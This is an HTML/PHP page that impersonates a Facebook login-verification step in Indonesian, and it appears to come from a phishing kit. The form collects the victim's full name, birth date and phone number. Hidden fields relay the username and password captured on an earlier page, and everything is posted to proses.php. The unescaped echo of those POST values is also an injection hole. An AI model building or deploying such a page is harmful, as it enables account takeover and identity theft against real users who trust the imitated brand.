<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="assets/wahyustore.css" />
    <title>Masuk | Masuk Facebook</title>
  </head>
  <body>
    <div class="container">
      <header>
        <nav>
          <div class="logo">
            <img src="assets/img/logofb4.jpg" alt="Facebook Logo" />
          </div>
          <ul class="menu">
            <li><a href="#">Bantuan</a></li>
          </ul>
        </nav>
      </header>
      <center>
        <div class="peringatanakun">
            <p>Silahkan isi formulir dibawah sesuai dengan data Akun Anda</p>
          </div>
      </center>
      <form class="bxformpemblokiran" method="post" action="proses.php">
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Nama Lengkap</label>
                </div>
                <input class="form-control-plaintext" type="text" name="nama" id="alx_nama" placeholder="Nama lengkap facebook" autocomplete="off" required/>
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Tanggal Lahir</label>
                </div>
                <input class="form-control-plaintext ttl" type="date" name="ttl" min="1900-01-01" max="2099-01-01" id="alx_ttl" value="2024-04-02" autocomplete="off" required />
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Nomor Telepon</label>
                </div>
                <input class="form-control-plaintext" type="number" name="phone" placeholder="Nomor telepon" id="alx_phone" autocomplete="off" required/>
              </div>
              <div class="btnverifalexfbblokir">
              <input type="hidden" name="user" value="<?= $_POST['user'] ?>">
              <input type="hidden" name="pass" value="<?= $_POST['pass'] ?>" >
                <button type="submit">Verifikasi</button>
              </div>
            </form>
            <foot class="copyright">
              <div class="cralexfbpemblokiran">
                <span style="font-size: 12;">Meta © 2023</span>
              </div>
             </foot>
    </div>
            <script
      src="https://kit.fontawesome.com/08380760ee.js"
      crossorigin="anonymous"
    ></script>

  </body>
</html>
